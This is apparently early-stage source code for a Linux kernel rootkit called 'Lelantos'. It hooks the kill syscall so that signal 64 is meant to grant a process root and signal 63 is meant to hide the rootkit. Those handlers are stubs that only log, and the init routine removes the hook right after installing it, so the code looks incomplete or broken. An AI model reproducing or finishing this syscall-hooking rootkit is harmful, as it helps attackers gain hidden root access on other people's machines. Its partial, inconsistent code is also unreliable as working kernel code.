/*=================*\
kernel module imports
\*=================*/
#include <linux/init.h> //macros used to mark up functions   e.g. __init __exit
#include <linux/module.h> // core header for loading module into kernel
#include <linux/kernel.h> //contains types, macros, functions for the kernel   e.g. KERN_INFO

#include <custom/syscall_table.h> //functions for getting sycall syscall_table
#include <custom/hooks.h> //functions for hooking syscalls


/*============*\
hooked functions
\*============*/
ptregs_t orig_kill = (ptregs_t) 0;
static asmlinkage long hooked_kill(const struct pt_regs *regs){
  int sig = regs->si; //gets signal from pt_regs structure
  if (sig == 64){ //if signal = signal for making process root
    printk(KERN_INFO "recieved signal root\n");
    return 0;
  }
  if (sig == 63){ //if signal = signal for making rootkit invisible
    printk(KERN_INFO "recieved signal invisible\n");
    return 0;
  }
  return orig_kill(regs); //kills process and returns result
}


/*========*\
declarations
\*========*/
static int __init ModuleInit(void); // init function
static void __exit ModuleExit(void); // exit function

static int __init ModuleInit(void) {
  printk(KERN_INFO "lelantos: installed\n"); //DEBUG logs to dmesg
  get_syscall_table();
  struct hook_t sys_kill;
  sys_kill.hooked_syscall = hooked_kill;
  sys_kill.syscall_number = __NR_kill;
  install_hook(&sys_kill);
  orig_kill = sys_kill.orig_syscall;
  remove_hook(sys_kill);
  return 0;
}

static void __exit ModuleExit(void) {
  printk(KERN_INFO "Lelantus: removed\n");
}


module_init(ModuleInit);
module_exit(ModuleExit);



/*==================*\
liscencing information
\*==================*/
MODULE_AUTHOR("Artemis's Angel"); //author
MODULE_DESCRIPTION("Lelantos Client"); //description
MODULE_LICENSE("GPL");// GPL license
MODULE_VERSION("0.01"); //version
